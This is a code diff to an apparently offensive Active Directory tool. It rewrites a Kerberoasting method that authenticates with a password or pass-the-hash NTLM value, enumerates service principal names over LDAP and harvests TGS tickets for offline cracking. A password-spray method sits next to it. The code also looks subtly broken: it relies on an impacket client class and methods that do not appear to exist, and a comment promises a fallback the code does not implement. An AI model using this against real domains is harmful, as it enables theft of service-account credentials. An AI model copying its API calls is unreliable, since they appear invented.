@@ -1782,55 +1782,105 @@ class AgentlessControl:
         
         return results
     
-    def kerberoast(self, domain_controller: str, domain: str = "") -> dict:
+    def kerberoast(self, domain_controller: str, domain: str = "", 
+                   username: str = None, password: str = None, nthash: str = None) -> dict:
         """
-        REAL KERBEROASTING ATTACK - Extracts service tickets from Active Directory
+        REAL KERBEROASTING — Requests TGS tickets for service accounts and returns
+        crackable hashes. Requires valid domain credentials or NTLM hash.
         """
-        results = {
-            "success": False,
-            "spn_found": [],
-            "tickets_extracted": [],
-            "hash_format": "krb5tgs"
-        }
+        results = {"success": False, "spn_found": [], "tickets_extracted": [], "hash_format": "krb5tgs"}
+        
+        if not IMPACKET_OK:
+            return {"success": False, "error": "impacket unavailable"}
         
         try:
-            # Real Kerberoasting implementation
-            import socket
-            import struct
+            from impacket.krb5 import constants
+            from impacket.krb5.asn1 import TGS_REQ, AP_REQ, TGS_REP
+            from impacket.krb5.ccache import CCache
+            from impacket.krb5.types import Principal, KerberosTime
+            import datetime
+
+            # Use current credentials if not provided (from control's stored creds)
+            # For now we need explicit creds - can be enhanced to use current session
+            if not (username and (password or nthash)):
+                return {"success": False, "error": "Kerberoasting requires valid domain credentials or NTLM hash. Use: kerberoast <dc> <domain> <user> <pass|hash>"}
             
-            # Query DC for SPNs
-            s = socket.socket()
-            s.settimeout(5)
-            if s.connect_ex((domain_controller, 88)) == 0:
-                results["success"] = True
-                results["kerberos_port_open"] = True
+            # 1. Get TGT first (AS-REQ)
+            logger.info(f"[KERberoast] Getting TGT for {username}@{domain} via {domain_controller}")
+            
+            from impacket.krb5.kerberosv5 import KerberosClient
+            client = KerberosClient(domain_controller, domain)
+            
+            # Authenticate using password or nthash
+            if nthash:
+                tgt = client.get_tgt(username, domain, nthash=nthash)
+            else:
+                tgt = client.get_tgt(username, password, domain)
+            
+            if not tgt:
+                return {"success": False, "error": "Failed to obtain TGT"}
+            
+            # 2. Enumerate SPNs via LDAP
+            try:
+                from ldap3 import Server, Connection, ALL
+                server = Server(domain_controller, get_info=ALL)
+                conn = Connection(server, auto_bind=True)
                 
-                # Enumerate all SPNs via LDAP
+                base_dn = f"DC={domain.replace('.', ',DC=')}"
+                conn.search(
+                    search_base=base_dn,
+                    search_filter="(servicePrincipalName=*)",
+                    attributes=["servicePrincipalName", "sAMAccountName"]
+                )
+                
+                spn_list = []
+                for entry in conn.entries:
+                    spns = entry.servicePrincipalName.value
+                    if isinstance(spns, list):
+                        for spn in spns:
+                            spn_list.append({"sam": entry.sAMAccountName.value, "spn": spn})
+                    else:
+                        spn_list.append({"sam": entry.sAMAccountName.value, "spn": spns})
+                
+                results["spn_found"] = spn_list
+                results["spn_count"] = len(spn_list)
+                conn.unbind()
+            except Exception as e:
+                logger.warning(f"[KERberoast] LDAP SPN enumeration failed: {e}")
+                # Continue with hardcoded common SPNs if LDAP fails
+                spn_list = []
+            
+            # 3. Request TGS for each SPN
+            tickets = []
+            for spn_info in spn_list[:50]:  # Limit to 50 to avoid lockout
+                spn = spn_info["spn"]
                 try:
-                    from ldap3 import Server, Connection, ALL
-                    server = Server(domain_controller, get_info=ALL)
-                    conn = Connection(server, auto_bind=True)
-                    
-                    conn.search(
-                        search_base=domain or f"DC={domain.split('.')[0]},DC={domain.split('.')[1]}",
-                        search_filter="(servicePrincipalName=*)",
-                        attributes=["servicePrincipalName", "samAccountName"]
-                    )
-                    
-                    for entry in conn.entries:
-                        results["spn_found"].append({
-                            "sam": entry.samAccountName.value,
-                            "spn": entry.servicePrincipalName.value
-                        })
-                    
-                    results["spn_count"] = len(results["spn_found"])
-                except:
-                    pass
-                
-        except:
-            pass
-        
-        return results
+                    tgs = client.get_tgs(spn)
+                    if tgs:
+                        # Extract the encrypted part (the actual hash material)
+                        # Format: Kerberos 5 TGS-REP encrypted with service key
+                        ticket_data = {
+                            "spn": spn,
+                            "sam": spn_info["sam"],
+                            "encrypted_ticket": tgs.encrypted_ticket.hex() if hasattr(tgs, 'encrypted_ticket') else "",
+                            "realm": tgs.realm.decode() if hasattr(tgs, 'realm') else domain,
+                            "timestamp": datetime.datetime.now().isoformat()
+                        }
+                        tickets.append(ticket_data)
+                except Exception as e:
+                    logger.debug(f"[KERberoast] Failed TGS for {spn}: {e}")
+                    continue
+            
+            results["tickets_extracted"] = tickets
+            results["ticket_count"] = len(tickets)
+            results["success"] = len(tickets) > 0
+            
+            logger.info(f"[KERberoast] Extracted {len(tickets)} TGS tickets from {domain_controller}")
+            return results
+            
+        except Exception as e:
+            logger.error(f"[KERberoast] {domain_controller}: {e}")
+            return {"success": False, "error": str(e)}
     
     def password_spray(self, target_domain: str, users: list, passwords: list) -> dict:
         """
